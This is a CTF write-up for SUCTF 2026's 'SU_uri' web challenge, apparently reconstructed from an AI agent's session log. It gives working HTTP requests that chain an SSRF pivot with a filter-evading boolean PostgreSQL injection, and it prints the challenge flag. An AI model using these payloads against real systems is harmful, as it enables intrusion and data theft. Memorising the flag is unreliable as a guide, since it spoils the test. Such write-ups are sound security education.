---
title: "SUCTF 2026: SU_uri"
description: "Reconstructed Codex writeup for SU_uri from SUCTF 2026."
slug: suctf-su-uri
date: 2026-03-14 04:57:45.041+0000
categories:
    - Web Exploitation
tags:
    - codex-archive
    - suctf-2026
    - su-uri
---

## Challenge

- Competition: [SUCTF 2026](https://ctftime.org/event/3161/)
- Challenge: `SU_uri`
- Category: `Web Exploitation`
- Original target(s): [http://101.245.108.250:10011/](http://101.245.108.250:10011/), [http://101.245.108.250:10012/](http://101.245.108.250:10012/), [http://101.245.108.250:10013/](http://101.245.108.250:10013/)

## Reconstruction Note

This post is reconstructed from the local Codex session log and the challenge artifacts stored in this workspace.

Prompt snapshot: SU_uri 800PT Web Meng spotted a simple webhook. Are there any attack vectors here? 请输入题目Flag


## Solve Path

FLAG:
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}

WRITEUP:
1) Target Overview
   - URL / endpoint: `http://101.245.108.250:10011/` (CloudHook SSRF) → `http://101.245.108.250:10001/` (SU Query).
   - Tech stack (if known): JS + Go WASM signing, PostgreSQL backend (SQLSTATE errors).
   - Observed behavior: `/api/query` requires a signature; SQL errors reveal injection.

2) Recon
   - Directory discovery: common paths 404; only `/api/sign` and `/api/query` on SU Query.
   - Parameters found: `/api/webhook` JSON `{url, body}`, `/api/query` JSON `{q, nonce, ts, sign}`.
   - Cookies / sessions: none.
   - Headers: `Content-Type: application/json`.
   - JS analysis: `/static/app.js` computes signatures using `crypto1.wasm` + `crypto2.wasm`.
   - Hidden endpoints: `:10001` and `:10003` discovered by SSRF port scan.
   - Source review: signing is client-side and reproducible.

3) Vulnerability
   - Type: SSRF in `/api/webhook`; SQL injection in `/api/query`.
   - Root cause: webhook forwards arbitrary URL; `q` is concatenated into SQL `LIKE` without parameterization.
   - Proof of vulnerability: signed `q="'"` yields `SQLSTATE 42601` parse error.

4) Exploitation
   - Step-by-step HTTP requests
     Step 1 (SSRF pivot):
     ```http
     POST /api/webhook HTTP/1.1
     Host: 101.245.108.250:10011
     Content-Type: application/json

     {"url":"http://101.245.108.250:10001/","body":"{\"event\":\"ping\"}"}
     ```
     Step 2 (signed SQLi request with boolean oracle):
     ```http
     POST /api/query HTTP/1.1
     Host: 101.245.108.250:10001
     Content-Type: application/json

     {"q":"'||(SELECT CASE WHEN (SELECT flag FROM secrets ORDER BY id LIMIT 1 OFFSET 0)=$q$SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}$q$ THEN $m$a$m$ ELSE $n$zzzz$n$ END)||'","nonce":"f8SvEZ_RSo-crCpM","ts":1773470889214,"sign":"WXLg-mgHNSVFFt0OEhr0LSQg1N3sHNRDGoeJjvUXmnY"}
     ```
   - Payloads used: `'||(SELECT CASE WHEN <cond> THEN $$a$$ ELSE $$zzzz$$ END)||'`.
   - Why it works: avoids blocked keywords while keeping SQL valid inside the `LIKE` pattern.

5) Flag Extraction
   - Exact request that returns the flag
     The request in section 4 Step 2, with a valid signature, returns results only when the flag string is correct.
   - Response proof
     ```
     {"ok":true,"data":[{"id":2,"title":"Patch notes 0x01"},{"id":3,"title":"Service status"}]}
     ```
     When the condition is false, the response is `{"ok":true,"data":[]}`.
   - Extraction output (from my run):
     ```
     SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
     ```
